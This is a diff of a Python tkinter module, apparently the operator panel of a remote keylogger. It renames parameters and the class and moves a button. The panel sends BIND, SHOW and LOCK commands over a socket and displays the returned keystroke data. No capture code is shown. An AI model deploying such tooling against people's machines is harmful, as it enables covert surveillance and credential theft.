@@ -4,8 +4,8 @@ from tkinter import Button, Text
 from DC_Constant import BACKGROUND, BUFFERSIZE, WIDTH, HEIGHT, FORMAT
 
 
-def bind(client, button):
-    client.sendall("BIND".encode(FORMAT))
+def bind(main_connect, button):
+    main_connect.sendall("BIND".encode(FORMAT))
     if button["text"] == "BIND":
         button.configure(text="UNBIND")
     else:
@@ -13,9 +13,9 @@ def bind(client, button):
     return
 
 
-def show(client, textbox):
-    client.sendall("SHOW".encode(FORMAT))
-    data = client.recv(BUFFERSIZE).decode(FORMAT)
+def show(main_connect, textbox):
+    main_connect.sendall("SHOW".encode(FORMAT))
+    data = main_connect.recv(BUFFERSIZE).decode(FORMAT)
     
     textbox.config(state="normal")
     textbox.insert(tk.END, data)
@@ -30,8 +30,8 @@ def delete(textbox):
     return
 
 
-def lock(client, button):
-    client.sendall("LOCK".encode(FORMAT))
+def lock(main_connect, button):
+    main_connect.sendall("LOCK".encode(FORMAT))
     if button["text"] == "LOCK":
         button.configure(text="UNLOCK")
     else:
@@ -43,7 +43,7 @@ def back():
     return
 
 
-class KeyloggerUI(Frame):
+class Keylogger(Frame):
     def __init__(self, parent, client):
         Frame.__init__(self, parent)
         self.configure(
@@ -142,5 +142,5 @@ class KeyloggerUI(Frame):
             highlightthickness=2,
             command=back,
         )
-
-        self.button_back.place(x=730, y=560, width=200, height=30)
+        
+        self.button_back.place(x=20, y=350, width=200, height=30)
